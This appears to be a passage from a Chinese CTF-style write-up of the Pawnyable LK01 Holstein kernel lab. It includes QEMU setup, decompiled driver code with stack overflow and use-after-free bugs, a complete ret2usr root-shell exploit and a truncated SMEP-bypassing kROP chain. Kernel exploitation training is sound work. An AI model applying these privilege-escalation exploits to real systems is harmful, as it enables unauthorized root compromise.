<span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token comment">#echo 1 > /proc/sys/kernel/dmesg_restrict</span><span class="token comment">##</span><span class="token comment">## Install driver</span><span class="token comment">##</span>insmod /root/vuln.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/holstein c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> holstein /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token comment">##</span><span class="token comment">## User shell</span><span class="token comment">##</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Holstein v1 (LK01) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1337</span> <span class="token function">sh</span><span class="token comment">##</span><span class="token comment">## Cleanup</span><span class="token comment">##</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kptr_restrict为2，先改为1，方便查看函数地址</p><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> qemu64 <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token number">1</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>几乎没有开启任何保护<br>加上-s，方便调试</p><h3 id="vuln-ko"><a href="#vuln-ko" class="headerlink" title="vuln.ko"></a>vuln.ko</h3><p>开了NX</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/xinri/LK01/qemu/rootfs/root/vuln.ko'</span>    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="module-initialize"><a href="#module-initialize" class="headerlink" title="module_initialize"></a>module_initialize</h4><p>在&#x2F;dev下注册了一个名为 holstein 的设备</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"holstein"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_44E<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>    qword_960 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>_this_module<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_46B<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="module-open"><a href="#module-open" class="headerlink" title="module_open"></a>module_open</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_3AA<span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">_kmalloc</span><span class="token punctuation">(</span><span class="token number">0x400LL</span><span class="token punctuation">,</span> <span class="token number">3264LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> g_buf <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_3C0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">4294967284LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分配了一个0x400的内存块</p><h4 id="module-read"><a href="#module-read" class="headerlink" title="module_read"></a>module_read</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v5<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-400h] BYREF</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x3F8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_3D1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>g_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> a3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> a3<span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_3E7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>copy_to_user(buf，g_buf，size)，可以kbuf越界读</p><h4 id="module-write"><a href="#module-write" class="headerlink" title="module_write"></a>module_write</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_write</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rcx</span>  __int64 v6<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-400h] BYREF</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_3FE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">copy_from_user</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_415<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> g_buf<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>g_buf <span class="token operator">=</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">1016</span><span class="token punctuation">)</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span><span class="token number">127</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">qmemcpy</span><span class="token punctuation">(</span>      <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFFFF8LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6 <span class="token operator">-</span> <span class="token punctuation">(</span>v4 <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFFFF8LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v4 <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFF8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFF8</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a3<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>copy_from_user(kbuf，buf，size)，栈溢出</p><h4 id="module-close"><a href="#module-close" class="headerlink" title="module_close"></a>module_close</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_42E<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                                 <span class="token comment">// 存在UAF</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二-EXP"><a href="#二-EXP" class="headerlink" title="(二)EXP"></a>(二)EXP</h2><p>很明显的栈溢出</p><p>打一个ret2usr</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc exp.c -o exp -static -masm=intel</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RET</span> <span class="token expression"><span class="token number">0xffffffff8160bf7e</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff810202af</span><span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e390</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> kernel_base<span class="token operator">=</span><span class="token number">0xffffffffc0000000</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>commit_creds_addr<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"swapgs;"</span><span class="token string">"push %0;"</span><span class="token string">"push %1;"</span><span class="token string">"push %2;"</span><span class="token string">"push %3;"</span><span class="token string">"push %4;"</span><span class="token string">"iretq;"</span><span class="token operator">:</span><span class="token operator">:</span><span class="token string">"r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>getRootShell<span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Open Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> ropchain<span class="token punctuation">[</span><span class="token number">0x410</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ropchain<span class="token punctuation">[</span><span class="token number">0x408</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootPrivilige<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/34635a4f3364dca9e7d315f301dfc8e3_MD5.jpeg"></p><h1 id="二、LK01-Holstein-v1-smep"><a href="#二、LK01-Holstein-v1-smep" class="headerlink" title="二、LK01 Holstein v1 +smep"></a>二、LK01 Holstein v1 +smep</h1><p>无法使用ret2usr，这里使用kROP来绕过smep</p><p>选择的gadget是<code>0xffffffff8160c96b: mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret;</code></p><p>这里卡住的一点是，汇编指令rep。它是一个汇编语言的指令前缀，表示重复执行后面的指令，rep指令可以通过设置计数器来控制重复次数，计数器的值存放在<code>ecx</code>寄存器中，直到为0停止。因此需要gadget <code>POP_RCX_RET</code>来赋值为0中止循环</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc exp.c -o exp -static -masm=intel</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RET</span> <span class="token expression"><span class="token number">0xffffffff8160bf7e</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff810202af</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8127bbdc</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8160c96b</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff812ea083</span><span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e390</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> kernel_base<span class="token operator">=</span><span class="token number">0xffffffffc0000000</span><span class="token 